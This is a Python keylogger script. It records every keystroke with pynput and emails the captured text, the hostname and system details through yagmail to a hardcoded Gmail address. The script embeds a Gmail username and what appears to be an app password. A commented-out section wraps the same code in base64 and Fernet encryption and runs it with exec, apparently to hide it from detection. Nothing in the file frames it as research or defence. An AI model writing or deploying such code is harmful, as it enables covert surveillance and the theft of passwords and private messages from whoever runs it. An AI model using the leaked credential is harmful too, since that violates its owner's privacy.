from cryptography.fernet import Fernet
import base64
import pynput
from pynput.keyboard import Listener, Key
import socket as s
import email
import yagmail
import datetime as dt
import platform as p
today=dt.datetime.now().strftime('%Y-%m-%d at %H:%M')
r=("\n")*4

class Email:
    def __init__(self,email):
        self.email=email

    def send_email(self,testo):
        self.testo=testo
        email= yagmail.SMTP(user='dariojava99', password='peqhxybjekikvqjn')
        email.send(to=self.email, subject= "Here's what " + s.gethostname() + " typed", 
                    contents=self.testo +"\n"+
                    r+str(p.platform())+"\n" +
                    str(p.uname()) + "\n" +
                    today)


sendemail = Email("a.rotili94@gmail.com")

class TestoEmail:
    testo = ""

    def aggiungiStringa(keyChar):
        return keyChar

def press(key):
    if key == Key.space:
        TestoEmail.testo +=" "
    elif key == Key.enter:
        TestoEmail.testo += "\n" 
    elif key == Key.shift:
        TestoEmail.testo += "" 
    elif key == Key.backspace:
        TestoEmail.testo = TestoEmail.testo[:-2]       
    else:    
        TestoEmail.testo += TestoEmail.aggiungiStringa(str(key))  
    print(key)


def release(key):
    if key == Key.esc:
        return False

with Listener(on_press = press, on_release = release) as listener:
    listener.join()

print(TestoEmail.testo)   
TestoEmail.testo
sendemail.send_email(TestoEmail.testo.replace("'","")) 

# your_code = base64.b64encode(b"""import pynput
# from pynput.keyboard import Listener, Key
# import socket as s
# import email
# import yagmail
# import datetime as dt
# import platform as p
# today=dt.datetime.now().strftime('%Y-%m at %H:%M')
# r=(\n)*4

# class Email:
#     def __init__(self,email):
#         self.email=email

#     def send_email(self,testo):
#         self.testo=testo
#         email= yagmail.SMTP(user='dariojava99', password='peqhxybjekikvqjn')
#         email.send(to=self.email, subject= "Here's what " + s.gethostname() + " typed", 
#                     contents=self.testo +"\n"+
#                     r+str(p.platform())+"\n" +
#                     str(p.uname()) + "\n" +
#                     today)


# sendemail = Email("a.rotili94@gmail.com")

# class TestoEmail:
#     testo = ""

#     def aggiungiStringa(keyChar):
#         return keyChar

# def press(key):
#     if key == Key.space:
#         TestoEmail.testo +=" "
#     elif key == Key.enter:
#         TestoEmail.testo += "\n" 
#     elif key == Key.shift:
#         TestoEmail.testo += "" 
#     elif key == Key.backspace:
#         TestoEmail.testo = TestoEmail.testo[:-2]       
#     else:    
#         TestoEmail.testo += TestoEmail.aggiungiStringa(str(key))  
#     print(key)


# def release(key):
#     if key == Key.esc:
#         return False

# with Listener(on_press = press, on_release = release) as listener:
#     listener.join()

# print(TestoEmail.testo)   
# TestoEmail.testo
# sendemail.send_email(TestoEmail.testo.replace("'","")) 
# """)

# exec(base64.b64decode(your_code))

# key = Fernet.generate_key()
# encryption_type = Fernet(key)
# encrypted_message = encryption_type.encrypt(code)

# decrypted_message = encryption_type.decrypt(encrypted_message)

# exec(decrypted_message)

